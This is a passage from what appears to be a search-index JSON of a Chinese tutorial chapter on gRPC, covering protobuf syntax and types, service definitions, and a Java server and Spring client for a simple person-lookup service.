\u6587\u4ef6\u7684\u8bed\u6cd5\u7248\u672c\uff0c\u76ee\u524d\u6700\u65b0\u7684\u662f 3 \u7248\u672c\u3002 syntax = \"proto3\"; \u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e9b\u9009\u9879\uff0c\u53ef\u4ee5\u7528 option \u5173\u952e\u5b57\u3002 option java_multiple_files = true; \u6d88\u606f\u7c7b\u578b \u6d88\u606f\u7c7b\u578b\u662f\u4e00\u4e2a\u7ed3\u6784\u5316\u7684\u6570\u636e\u7c7b\u578b\uff0c\u7528\u4e8e\u5b9a\u4e49\u6d88\u606f\u7684\u7ed3\u6784\u3002\u6d88\u606f\u7c7b\u578b\u53ef\u4ee5\u5305\u542b\u6807\u91cf\u7c7b\u578b\u3001\u679a\u4e3e\u7c7b\u578b\u3001\u6d88\u606f\u7c7b\u578b\u3001\u6570\u7ec4\u7c7b\u578b\u7b49\u3002 message Person { string name = 1; int32 id = 2; string email = 3; } \u6ce8\u610f\uff0c\u4e0a\u9762\u7684 = \u4e0d\u4ee3\u8868\u8d4b\u503c\uff0c\u800c\u662f\u5b57\u6bb5\u7684\u6807\u8bc6\u7b26\uff0c\u6216\u8005\u8bf4\u662f\u6807\u53f7\u3002\u8fd9\u4e2a\u6807\u8bc6\u7b26\u662f\u552f\u4e00\u7684\uff0c\u7528\u4e8e\u6807\u8bc6\u5b57\u6bb5\u3002\u8fd9\u4e2a\u6807\u8bc6\u7b26\u662f\u4e00\u4e2a\u6570\u5b57\uff0c\u53ef\u4ee5\u662f 1 \u5230 $ 2^{29} - 1 $ \u4e4b\u95f4\u7684\u4efb\u610f\u6570\u5b57\u3002\u8fd9\u4e2a\u6570\u5b57\u7528\u4e8e\u6807\u8bc6\u5b57\u6bb5\u7684\u987a\u5e8f\uff0c\u4e0d\u8981\u6539\u53d8\u8fd9\u4e2a\u6570\u5b57\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u6570\u5b57\u4f1a\u7528\u4e8e\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u30021 \u5230 15 \u7684\u53c2\u6570\u7f16\u7801\u65f6\u4f7f\u7528 1 \u4e2a\u5b57\u8282\uff0c\u540e\u7eed\u7684\u53c2\u6570\u7f16\u7801\u65f6\u4f1a\u4f7f\u7528\u66f4\u591a\u7684\u5b57\u8282\u6570\u3002\u56e0\u6b64\uff0c\u5728\u8bbe\u8ba1\u65f6\uff0c\u5982\u679c\u67d0\u5b57\u6bb5\u4e0d\u5e38\u7528\uff0c\u628a\u5b83\u653e\u5728\u540e\u9762\uff0c\u4e3a\u4ee5\u540e\u53ef\u80fd\u7684\u9ad8\u9891\u53c2\u6570\u7559\u4e0b\u4f4d\u7f6e\u3002 \u5185\u7f6e\u7684\u7c7b\u578b\u5217\u8868\u5982\u4e0b\uff0c .proto Type Notes C++ Type Java Type Python Type Go Type Ruby Type C# Type PHP Type double double double float float64 Float double float float float float float float32 Float float float int32 \u4f7f\u7528\u53d8\u957f\u7f16\u7801\uff0c\u5bf9\u4e8e\u8d1f\u503c\u7684\u6548\u7387\u5f88\u4f4e\uff0c\u5982\u679c\u4f60\u7684\u57df\u6709\u53ef\u80fd\u6709\u8d1f\u503c\uff0c\u8bf7\u4f7f\u7528sint64\u66ff\u4ee3 int32 int int int32 Fixnum \u6216\u8005 Bignum\uff08\u6839\u636e\u9700\u8981\uff09 int integer uint32 \u4f7f\u7528\u53d8\u957f\u7f16\u7801 uint32 int int/long uint32 Fixnum \u6216\u8005 Bignum\uff08\u6839\u636e\u9700\u8981\uff09 uint integer uint64 \u4f7f\u7528\u53d8\u957f\u7f16\u7801 uint64 long int/long uint64 Bignum ulong integer/string sint32 \u4f7f\u7528\u53d8\u957f\u7f16\u7801\uff0c\u8fd9\u4e9b\u7f16\u7801\u5728\u8d1f\u503c\u65f6\u6bd4int32\u9ad8\u6548\u7684\u591a int32 int int int32 Fixnum \u6216\u8005 Bignum\uff08\u6839\u636e\u9700\u8981\uff09 int integer sint64 \u4f7f\u7528\u53d8\u957f\u7f16\u7801\uff0c\u6709\u7b26\u53f7\u7684\u6574\u578b\u503c\u3002\u7f16\u7801\u65f6\u6bd4\u901a\u5e38\u7684int64\u9ad8\u6548\u3002 int64 long int/long int64 Bignum long integer/string fixed32 \u603b\u662f4\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u6570\u503c\u603b\u662f\u6bd4228\u5927\u7684\u8bdd\uff0c\u8fd9\u4e2a\u7c7b\u578b\u4f1a\u6bd4uint32\u9ad8\u6548\u3002 uint32 int int uint32 Fixnum \u6216\u8005 Bignum\uff08\u6839\u636e\u9700\u8981\uff09 uint integer fixed64 \u603b\u662f8\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u6570\u503c\u603b\u662f\u6bd4256\u5927\u7684\u8bdd\uff0c\u8fd9\u4e2a\u7c7b\u578b\u4f1a\u6bd4uint64\u9ad8\u6548\u3002 uint64 long int/long uint64 Bignum ulong integer/string sfixed32 \u603b\u662f4\u4e2a\u5b57\u8282 int32 int int int32 Fixnum \u6216\u8005 Bignum\uff08\u6839\u636e\u9700\u8981\uff09 int integer sfixed64 \u603b\u662f8\u4e2a\u5b57\u8282 int64 long int/long int64 Bignum long integer/string bool bool boolean bool bool TrueClass/FalseClass bool boolean string \u4e00\u4e2a\u5b57\u7b26\u4e32\u5fc5\u987b\u662fUTF-8\u7f16\u7801\u6216\u80057-bit ASCII\u7f16\u7801\u7684\u6587\u672c\u3002 string String str/unicode string String (UTF-8) string string bytes \u53ef\u80fd\u5305\u542b\u4efb\u610f\u987a\u5e8f\u7684\u5b57\u8282\u6570\u636e\u3002 string ByteString str []byte String (ASCII-8BIT) ByteString string \u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u679a\u4e3e\u7c7b\u578b\uff0c enum PhoneType { MOBILE = 0; HOME = 1; WORK = 2; } message PhoneNumber { string number = 1; PhoneType type = 2; enum Owner { PERSONAL = 0; COMPANY = 1; } Owner owner = 3; } \u6d88\u606f\u7c7b\u578b\u53ef\u4ee5\u5d4c\u5957\uff0c\u4f8b\u5982\uff0c message PhoneNumber { string number = 1; enum PhoneType { MOBILE = 0; HOME = 1; WORK = 2; } PhoneType type = 2; } message Record { message Person { string name = 1; int32 id = 2; string email = 3; } Person person = 1; PhoneNumber phone = 2; } \u5982\u679c\u8981\u4f7f\u7528\u6570\u7ec4\uff0c\u4f7f\u7528 repeated \u5173\u952e\u5b57\uff0c message AddressBook { repeated Person person = 1; } protobuf \u8fd8\u6709\u4e00\u4e9b\u9ad8\u7ea7\u7279\u6027\uff0c\u4f8b\u5982 oneof \uff0c map \u7b49\uff0c\u8fd9\u91cc\u5c31\u4e0d\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u3002 \u670d\u52a1\u5b9a\u4e49 \u670d\u52a1\u5b9a\u4e49\u7528\u4e8e\u5b9a\u4e49\u670d\u52a1\u7684\u63a5\u53e3\u548c\u65b9\u6cd5\u3002\u670d\u52a1\u5b9a\u4e49\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u65b9\u6cd5\uff0c\u6bcf\u4e2a\u65b9\u6cd5\u5305\u542b\u4e00\u4e2a\u8bf7\u6c42\u6d88\u606f\u548c\u4e00\u4e2a\u54cd\u5e94\u6d88\u606f\u3002 service AddressBookService { rpc AddPerson(Person) returns (Person); rpc GetPerson(Person) returns (Person); } \u6ce8\u610f\uff0c\u5c0f\u62ec\u53f7\u91cc\u5fc5\u987b\u662f\u6d88\u606f\u7c7b\u578b\uff0c\u4e0d\u80fd\u662f\u57fa\u672c\u7c7b\u578b\u3002 \u670d\u52a1\u7aef\u5b9e\u73b0 \u73b0\u5728\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a proto \u6587\u4ef6\uff0cproto \u6587\u4ef6\u5e94\u5f53\u653e\u5728 src/main/proto \u76ee\u5f55\u4e0b\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a AddressBook.proto \u6587\u4ef6\uff0c syntax = \"proto3\"; option java_multiple_files = true; option java_package = \"io.github.fingerbone.demo\"; message Person { string name = 1; int32 id = 2; string email = 3; } message PersonId { int32 id = 1; } service EmailService { rpc GetPersonById(PersonId) returns (Person); rpc AddPerson(Person) returns (PersonId); } \u73b0\u5728\u5982\u679c\u7f16\u8bd1\u9879\u76ee\uff0c\u4f1a\u4ea7\u751f\u5bf9\u5e94\u7684\u7c7b\uff0c\u5bf9\u5e94\u7684 java \u6587\u4ef6\u5728 build/generated/source/proto/main/java/io/github/fingerbone/demo \u76ee\u5f55\u4e0b\u3002\u5f53\u7136\uff0c\u8fd9\u4e9b\u6587\u4ef6\u5f88\u590d\u6742\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u5173\u5fc3\u8fd9\u4e9b\u6587\u4ef6\u3002 \u8981\u5b9e\u73b0\u670d\u52a1\uff0c\u9700\u8981\u7ee7\u627f\u751f\u6210\u7684 Service\uff0c package io.github.fingerbone.demo; import io.grpc.stub.StreamObserver; import java.util.HashMap; import java.util.Map; public class EmailServiceImpl extends EmailServiceGrpc.EmailServiceImplBase { private final Map<Integer, Person> personMap = new HashMap<>(); @Override public void getPersonById(PersonId request, StreamObserver<Person> responseObserver) { Person person = personMap.get(request.getId()); if (person != null) { responseObserver.onNext(person); } else { responseObserver.onError(new Exception(\"Person not found\")); } responseObserver.onCompleted(); } @Override public void addPerson(Person request, StreamObserver<PersonId> responseObserver) { personMap.put(request.getId(), request); PersonId personId = PersonId.newBuilder().setId(request.getId()).build(); responseObserver.onNext(personId); responseObserver.onCompleted(); } } \u4f46\u662f\uff0c\u73b0\u5728\u53ea\u662f\u5b9e\u73b0\u4e86\u670d\u52a1\uff0c\u8fd8\u6ca1\u6709\u542f\u52a8\u670d\u52a1\u3002\u8981\u542f\u52a8\u670d\u52a1\uff0c\u9700\u8981\u4f7f\u7528 Server \u7c7b\uff0c package io.github.fingerbone.demo; import java.io.IOException; import io.grpc.Server; import io.grpc.ServerBuilder; public class Application { public static void main(String[] args) throws IOException, InterruptedException { Server server = ServerBuilder.forPort(8080) .addService(new EmailServiceImpl()) .build(); server.start(); server.awaitTermination(); } } \u7136\u540e\uff0c\u5728 gradle \u4e2d\u8bbe\u7f6e\u542f\u52a8\u7c7b\uff0c application { // Define the main class for the application. mainClass = 'io.github.fingerbone.demo.Application' } \u4f7f\u7528 gradle run \u542f\u52a8\u670d\u52a1\u3002 \u73b0\u5728\u53ef\u4ee5\u7528 Postman \u8fdb\u884c\u8c03\u8bd5\uff0c\u8f93\u5165\u5730\u5740\u5e76\u5bfc\u5165 proto \u6587\u4ef6\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u8c03\u7528\u670d\u52a1\u4e86\u3002 \u4e0d\u8fc7\uff0c\u66f4\u65b9\u4fbf\u7684\u65b9\u6cd5\u662f\u5f00\u542f\u53cd\u5c04\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 RPC \u4fe1\u606f\u3002 \u5728\u4f9d\u8d56\u4e2d\u52a0\u5165\uff0c implementation 'io.grpc:grpc-services:1.42.1' \u7136\u540e\u6dfb\u52a0\u53cd\u5c04\u670d\u52a1\uff0c public static void main(String[] args) throws IOException, InterruptedException { Server server = ServerBuilder.forPort(8080) .addService(new EmailServiceImpl()) .addService(ProtoReflectionService.newInstance()) .build(); server.start(); server.awaitTermination(); } \u73b0\u5728\uff0c\u5728 Postman \u4e2d\u4f7f\u7528 gRPC\uff0c\u7136\u540e\u8f93\u5165\u5730\u5740\uff0c\u5728\u8fc7\u7a0b\u9009\u62e9\u91cc\u4f7f\u7528\u53cd\u5c04\u81ea\u52a8\u83b7\u53d6\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528\u670d\u52a1\u4e86\u3002 \u5ba2\u6237\u7aef\u5b9e\u73b0 \u5ba2\u6237\u7aef\u8981\u5f15\u7528\u76f8\u540c\u7684\u5e93\uff0c\u5e76\u8fdb\u884c\u76f8\u540c\u7684\u914d\u7f6e\u548c\u7f16\u8bd1\u3002\u5982\u679c\u662f\u591a\u4f53\u9879\u76ee\uff0c\u6700\u597d\u5c06 proto \u6587\u4ef6\u5355\u72ec\u63d0\u53d6\u51fa\u6765\uff0c\u7136\u540e\u5728\u5176\u4ed6\u9879\u76ee\u4e2d\u5f15\u7528\u3002 \u5ba2\u6237\u7aef\u8981\u4f7f\u7528\uff0c implementation 'net.devh:grpc-client-spring-boot-starter' implementation project(':grpc-lib') \u7136\u540e\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165\uff0c grpc: client: address: default: host: localhost port: 8080 \u7136\u540e\u5728\u914d\u7f6e\u7c7b\u4e2d\u52a0\u5165\uff0c @Configuration public class GrpcConfig { @Bean public ManagedChannel managedChannel() { return ManagedChannelBuilder.forAddress(\"localhost\", 8080) .usePlaintext() .build(); } @Bean public EmailServiceGrpc.EmailServiceBlockingStub emailServiceBlockingStub(ManagedChannel managedChannel) { return EmailServiceGrpc.newBlockingStub(managedChannel); } } \u7136\u540e\u5728\u670d\u52a1\u4e2d\u4f7f\u7528\uff0c @Service public class EmailService { @Autowired private EmailServiceGrpc.EmailServiceBlockingStub emailServiceBlockingStub; public Person getPersonById(int id) { return emailServiceBlockingStub.getPersonById(PersonId.newBuilder().setId(id).build()); } public PersonId addPerson(Person person) { return emailServiceBlockingStub.addPerson(person); } } \u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u6837\u5b50\uff0c\u8fdc\u7a0b\u7684\u670d\u52a1\u5c31\u53ef\u4ee5\u50cf\u8c03\u7528\u672c\u5730\u670d\u52a1\u4e00\u6837\u8c03\u7528\u4e86\u3002","title":"gRPC"},{"location":"18/#ch18-grpc","text":"\u8fd9\u4e00\u7ae0\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 Java \u8bed\u8a00\uff0c\u4f46\u4e0d\u4f1a\u4f7f\u7528 Spring \u6846\u67b6\u3002 GraphQL \u9002\u5408\u7528\u4e8e\u8d44\u6e90\u578b\u63a5\u53e3\u3002\u4f46\u662f\uff0c\u8fd8\u6709\u4e9b\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u53bb\u8c03\u7528\u8fdc\u7a0b\u7684\u67d0\u4e2a\u670d\u52a1\uff0c\u800c\u975e\u67e5\u8be2\u8d44\u6e90\u3002\u5982\u679c\u7528 REST\uff0c\u90a3\u4e48\u5c31\u4f1a\u6709\u5f88\u591a\u7684\u63a5\u53e3\uff0c\u800c\u4e14\u6bcf\u4e2a\u63a5\u53e3\u90fd\u662f\u4e00\u4e2a\u8d44\u6e90\u3002\u5982\u679c\u7528 GraphQL\uff0c\u6700\u540e\u4f1a\u4ea7\u751f\u5f88\u591a\u6ca1\u6709\u610f\u4e49\u7684 mutation\u3002\u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u9700\u8981\u7528\u5230 RPC\uff08Remote Procedure Call\uff09\uff0c\u5373\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u3002 RPC \u662f\u4e0e HTTP \u540c\u7ea7\u522b\u7684\u534f\u8bae\uff0c\u4e14\u65e9\u4e8e\u540e\u8005\u7684\u51fa\u73b0\u3002\u5177\u4f53\u800c\u8a00\uff0cRPC \u5e0c\u671b\u80fd\u4f7f\u5f97\u8c03\u7528\u8fdc\u7a0b\u7684\u51fd\u6570\u4e0e\u8c03\u7528\u672c\u5730\u7684\u51fd\u6570\u4e00\u6837\u7b80\u5355\u3002 RPC \u6709\u8bb8\u591a\u5b9e\u73b0\uff0c\u5176\u4e2d\u6700\u5e38\u7528\u7684\u662f gRPC\uff0c\u7531 Google \u5f00\u53d1\u3002gRPC \u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\u3001\u5f00\u6e90\u548c\u901a\u7528\u7684 RPC \u6846\u67b6\uff0c\u57fa\u4e8e HTTP/2 \u534f\u8bae\uff0c\u652f\u6301\u591a\u79cd\u8bed\u8a00\u3002gRPC \u4f7f\u7528 Protocol Buffers \u4f5c\u4e3a\u63a5\u53e3\u63cf\u8ff0\u8bed\u8a00\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b9a\u4e49\u670d\u52a1\u548c\u6d88\u606f\u3002 \u6b64\u5916\uff0cJSON RPC\uff0cdubbo \u7b49\u4e5f\u662f\u5e38\u7528\u7684 RPC \u6846\u67b6\u3002","title":"\u5fae\u670d\u52a1\u901f\u6210 Ch18 gRPC"},{"location":"18/#grpc","text":"gRPC \u7684\u539f\u7406\u5f88\u7b80\u5355\u3002\u5f53\u672c\u5730\u8c03\u7528\u8fdc\u7a0b\u670d\u52a1\u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u8c03\u7528\u4e86\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\u3002\u8fd9\u4e2a\u4ee3\u7406\u5bf9\u8c61\u4f1a\u5c06\u8c03\u7528\u7684\u65b9\u6cd5\u3001\u53c2\u6570\u7b49\u4fe1\u606f\u5e8f\u5217\u5316\u6210\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u7136\u540e\u901a\u8fc7\u7f51\u7edc\u4f20\u8f93\u5230\u8fdc\u7a0b\u670d\u52a1\u3002\u8fdc\u7a0b\u670d\u52a1\u63a5\u6536\u5230\u6570\u636e\u540e\uff0c\u518d\u5c06\u6570\u636e\u53cd\u5e8f\u5217\u5316\uff0c\u8c03\u7528\u76f8\u5e94\u7684\u65b9\u6cd5\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u5e8f\u5217\u5316\u540e\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002 gRPC \u4e2d\uff0c\u8fd9\u4e2a\u5e8f\u5217\u5316\u65b9\u6cd5\u662f Protocol Buffers\u3002Protocol Buffers \u662f\u4e00\u79cd\u8f7b\u4fbf\u9ad8\u6548\u7684\u7ed3\u6784\u5316\u6570\u636e\u5b58\u50a8\u683c\u5f0f\uff0c\u7c7b\u4f3c\u4e8e XML\u3002Protocol Buffers \u53ef\u4ee5\u7528\u4e8e\u7ed3\u6784\u5316\u6570\u636e\u5e8f\u5217\u5316\uff0c\u5f88\u9002\u5408\u7528\u4e8e\u901a\u4fe1\u534f\u8bae\u548c\u6570\u636e\u5b58\u50a8\u3002 gRPC \u4e2d\uff0c\u4f7f\u7528 .proto \u6587\u4ef6\u6765\u7ea6\u5b9a\u63a5\u53e3\u3002 .proto \u6587\u4ef6\u5b9a\u4e49\u4e86\u670d\u52a1\u548c\u6d88\u606f\u3002\u7136\u540e\uff0c\u4f7f\u7528 protoc \u7f16\u8bd1\u5668\u751f\u6210\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u7684\u4ee3\u7801\u3002","title":"gRPC \u57fa\u672c\u539f\u7406"},{"location":"18/#_1","text":"\u5f15\u5165\u4f9d\u8d56\uff0c implementation 'io.grpc:grpc-stub:1.66.0' implementation 'io.grpc:grpc-protobuf:1.66.0' implementation 'io.grpc:grpc-netty:1.66.0' compileOnly 'org.apache.tomcat:annotations-api:6.0.53' \u7136\u540e\uff0c\u8fd8\u6709\u4e00\u4e2a\u63d2\u4ef6\uff0c id \"com.google.protobuf\" version \"0.9.4\" gRPC \u662f\u57fa\u4e8e .proto \u6587\u4ef6\u7684\uff0c .proto \u6587\u4ef6\u9700\u8981\u4e00\u4e2a protoc \u7f16\u8bd1\u5668\uff0c\u53ef\u4ee5\u4f7f\u7528\u672c\u5730\u7684 protoc\u3002\u6b64\u5916\uff0c\u8fd8\u9700\u8981\u4e00\u4e2a\u4ee3\u7801\u751f\u6210\u5668\u3002\u8fd9\u91cc\u4ee3\u7801\u751f\u6210\u5668\u4f7f\u7528 java lite \u7248\u672c\uff0cprotoc \u4e5f\u9002\u7528 java lite \u7248\u672c\u3002 implementation 'com.google.protobuf:protobuf-javalite:4.28.0-RC3' \u7136\u540e\u914d\u7f6e\u7f16\u8bd1 proto \u7684\u63d2\u4ef6\u548c\u4efb\u52a1\u3002 protobuf { protoc { artifact = \"com.google.protobuf:protoc:3.25.3\" } plugins { grpc { artifact = 'io.grpc:protoc-gen-grpc-java:1.66.0' } } generateProtoTasks { all()*.plugins { grpc {} } } } \u6ce8\u610f\uff0c\u8fd9\u4e2a\u7248\u672c\u5fc5\u987b\u5bf9\u5e94\u4e0a\uff0c\u6700\u65b0\u7248\u672c\u53c2\u8003 \u5b98\u65b9GitHub \u3002","title":"\u9879\u76ee\u914d\u7f6e"},{"location":"18/#protobuf","text":"proto \u6587\u4ef6\u662f\u4e00\u4e2a\u6587\u672c\u6587\u4ef6\uff0c\u7528\u4e8e\u5b9a\u4e49\u6d88\u606f\u7c7b\u578b\u548c\u670d\u52a1\u3002","title":"protobuf \u8bed\u6cd5"},{"location":"18/#_2","text":"\u5728 proto \u6587\u4ef6\u5934\uff0c\u9700\u8981\u6307\u5b9a proto \u6587\u4ef6\u7684\u8bed\u6cd5\u7248\u672c\uff0c\u76ee\u524d\u6700\u65b0\u7684\u662f 3 \u7248\u672c\u3002 syntax = \"proto3\"; \u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e9b\u9009\u9879\uff0c\u53ef\u4ee5\u7528 option \u5173\u952e\u5b57\u3002 option java_multiple_files = true;","title":"\u6587\u4ef6\u5934"},{"location":"18/#_3","text":"\u6d88\u606f\u7c7b\u578b\u662f\u4e00\u4e2a\u7ed3\u6784\u5316\u7684\u6570\u636e\u7c7b\u578b\uff0c\u7528\u4e8e\u5b9a\u4e49\u6d88\u606f\u7684\u7ed3\u6784\u3002\u6d88\u606f\u7c7b\u578b\u53ef\u4ee5\u5305\u542b\u6807\u91cf\u7c7b\u578b\u3001\u679a\u4e3e\u7c7b\u578b\u3001\u6d88\u606f\u7c7b\u578b\u3001\u6570\u7ec4\u7c7b\u578b\u7b49\u3002 message Person { string name = 1; int32 id = 2; string email = 3; } \u6ce8\u610f\uff0c\u4e0a\u9762\u7684 = \u4e0d\u4ee3\u8868\u8d4b\u503c\uff0c\u800c\u662f\u5b57\u6bb5\u7684\u6807\u8bc6\u7b26\uff0c\u6216\u8005\u8bf4\u662f\u6807\u53f7\u3002\u8fd9\u4e2a\u6807\u8bc6\u7b26\u662f\u552f\u4e00\u7684\uff0c\u7528\u4e8e\u6807\u8bc6\u5b57\u6bb5\u3002\u8fd9\u4e2a\u6807\u8bc6\u7b26\u662f\u4e00\u4e2a\u6570\u5b57\uff0c\u53ef\u4ee5\u662f 1 \u5230 $ 2^{29} - 1 $ \u4e4b\u95f4\u7684\u4efb\u610f\u6570\u5b57\u3002\u8fd9\u4e2a\u6570\u5b57\u7528\u4e8e\u6807\u8bc6\u5b57\u6bb5\u7684\u987a\u5e8f\uff0c\u4e0d\u8981\u6539\u53d8\u8fd9\u4e2a\u6570\u5b57\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u6570\u5b57\u4f1a\u7528\u4e8e\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u30021 \u5230 15 \u7684\u53c2\u6570\u7f16\u7801\u65f6\u4f7f\u7528 1 \u4e2a\u5b57\u8282\uff0c\u540e\u7eed\u7684\u53c2\u6570\u7f16\u7801\u65f6\u4f1a\u4f7f\u7528\u66f4\u591a\u7684\u5b57\u8282\u6570\u3002\u56e0\u6b64\uff0c\u5728\u8bbe\u8ba1\u65f6\uff0c\u5982\u679c\u67d0\u5b57\u6bb5\u4e0d\u5e38\u7528\uff0c\u628a\u5b83\u653e\u5728\u540e\u9762\uff0c\u4e3a\u4ee5\u540e\u53ef\u80fd\u7684\u9ad8\u9891\u53c2\u6570\u7559\u4e0b\u4f4d\u7f6e\u3002 \u5185\u7f6e\u7684\u7c7b\u578b\u5217\u8868\u5982\u4e0b\uff0c .proto Type Notes C++ Type Java Type Python Type Go Type Ruby Type C# Type PHP Type double double double float float64 Float double float float float float float float32 Float float float int32 \u4f7f\u7528\u53d8\u957f\u7f16\u7801\uff0c\u5bf9\u4e8e\u8d1f\u503c\u7684\u6548\u7387\u5f88\u4f4e\uff0c\u5982\u679c\u4f60\u7684\u57df\u6709\u53ef\u80fd\u6709\u8d1f\u503c\uff0c\u8bf7\u4f7f\u7528sint64\u66ff\u4ee3 int32 int int int32 Fixnum \u6216\u8005 Bignum\uff08\u6839\u636e\u9700\u8981\uff09 int integer uint32 \u4f7f\u7528\u53d8\u957f\u7f16\u7801 uint32 int int/long uint32 Fixnum \u6216\u8005 Bignum\uff08\u6839\u636e\u9700\u8981\uff09 uint integer uint64 \u4f7f\u7528\u53d8\u957f\u7f16\u7801 uint64 long int/long uint64 Bignum ulong integer/string sint32 \u4f7f\u7528\u53d8\u957f\u7f16\u7801\uff0c\u8fd9\u4e9b\u7f16\u7801\u5728\u8d1f\u503c\u65f6\u6bd4int32\u9ad8\u6548\u7684\u591a int32 int int int32 Fixnum \u6216\u8005 Bignum\uff08\u6839\u636e\u9700\u8981\uff09 int integer sint64 \u4f7f\u7528\u53d8\u957f\u7f16\u7801\uff0c\u6709\u7b26\u53f7\u7684\u6574\u578b\u503c\u3002\u7f16\u7801\u65f6\u6bd4\u901a\u5e38\u7684int64\u9ad8\u6548\u3002 int64 long int/long int64 Bignum long integer/string fixed32 \u603b\u662f4\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u6570\u503c\u603b\u662f\u6bd4228\u5927\u7684\u8bdd\uff0c\u8fd9\u4e2a\u7c7b\u578b\u4f1a\u6bd4uint32\u9ad8\u6548\u3002 uint32 int int uint32 Fixnum \u6216\u8005 Bignum\uff08\u6839\u636e\u9700\u8981\uff09 uint integer fixed64 \u603b\u662f8\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u6570\u503c\u603b\u662f\u6bd4256\u5927\u7684\u8bdd\uff0c\u8fd9\u4e2a\u7c7b\u578b\u4f1a\u6bd4uint64\u9ad8\u6548\u3002 uint64 long int/long uint64 Bignum ulong integer/string sfixed32 \u603b\u662f4\u4e2a\u5b57\u8282 int32 int int int32 Fixnum \u6216\u8005 Bignum\uff08\u6839\u636e\u9700\u8981\uff09 int integer sfixed64 \u603b\u662f8\u4e2a\u5b57\u8282 int64 long int/long int64 Bignum long integer/string bool bool boolean bool bool TrueClass/FalseClass bool boolean string \u4e00\u4e2a\u5b57\u7b26\u4e32\u5fc5\u987b\u662fUTF-8\u7f16\u7801\u6216\u80057-bit ASCII\u7f16\u7801\u7684\u6587\u672c\u3002 string String str/unicode string String (UTF-8) string string bytes \u53ef\u80fd\u5305\u542b\u4efb\u610f\u987a\u5e8f\u7684\u5b57\u8282\u6570\u636e\u3002 string ByteString str []byte String (ASCII-8BIT) ByteString string \u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u679a\u4e3e\u7c7b\u578b\uff0c enum PhoneType { MOBILE = 0; HOME = 1; WORK = 2; } message PhoneNumber { string number = 1; PhoneType type = 2; enum Owner { PERSONAL = 0; COMPANY = 1; } Owner owner = 3; } \u6d88\u606f\u7c7b\u578b\u53ef\u4ee5\u5d4c\u5957\uff0c\u4f8b\u5982\uff0c message PhoneNumber { string number = 1; enum PhoneType { MOBILE = 0; HOME = 1; WORK = 2; } PhoneType type = 2; } message Record { message Person { string name = 1; int32 id = 2; string email = 3; } Person person = 1; PhoneNumber phone = 2; } \u5982\u679c\u8981\u4f7f\u7528\u6570\u7ec4\uff0c\u4f7f\u7528 repeated \u5173\u952e\u5b57\uff0c message AddressBook { repeated Person person = 1; } protobuf \u8fd8\u6709\u4e00\u4e9b\u9ad8\u7ea7\u7279\u6027\uff0c\u4f8b\u5982 oneof \uff0c map \u7b49\uff0c\u8fd9\u91cc\u5c31\u4e0d\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u3002","title":"\u6d88\u606f\u7c7b\u578b"},{"location":"18/#_4","text":"\u670d\u52a1\u5b9a\u4e49\u7528\u4e8e\u5b9a\u4e49\u670d\u52a1\u7684\u63a5\u53e3\u548c\u65b9\u6cd5\u3002\u670d\u52a1\u5b9a\u4e49\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u65b9\u6cd5\uff0c\u6bcf\u4e2a\u65b9\u6cd5\u5305\u542b\u4e00\u4e2a\u8bf7\u6c42\u6d88\u606f\u548c\u4e00\u4e2a\u54cd\u5e94\u6d88\u606f\u3002 service AddressBookService { rpc AddPerson(Person) returns (Person); rpc GetPerson(Person) returns (Person); } \u6ce8\u610f\uff0c\u5c0f\u62ec\u53f7\u91cc\u5fc5\u987b\u662f\u6d88\u606f\u7c7b\u578b\uff0c\u4e0d\u80fd\u662f\u57fa\u672c\u7c7b\u578b\u3002","title":"\u670d\u52a1\u5b9a\u4e49"},{"location":"18/#_5","text":"\u73b0\u5728\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a proto \u6587\u4ef6\uff0cproto \u6587\u4ef6\u5e94\u5f53\u653e\u5728 src/main/proto \u76ee\u5f55\u4e0b\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a AddressBook.proto \u6587\u4ef6\uff0c syntax = \"proto3\"; option java_multiple_files = true; option java_package = \"io.github.fingerbone.demo\"; message Person { string name = 1; int32 id = 2; string email = 3; } message PersonId { int32 id = 1; } service EmailService { rpc GetPersonById(PersonId) returns (Person); rpc AddPerson(Person) returns (PersonId); } \u73b0\u5728\u5982\u679c\u7f16\u8bd1\u9879\u76ee\uff0c\u4f1a\u4ea7\u751f\u5bf9\u5e94\u7684\u7c7b\uff0c\u5bf9\u5e94\u7684 java \u6587\u4ef6\u5728 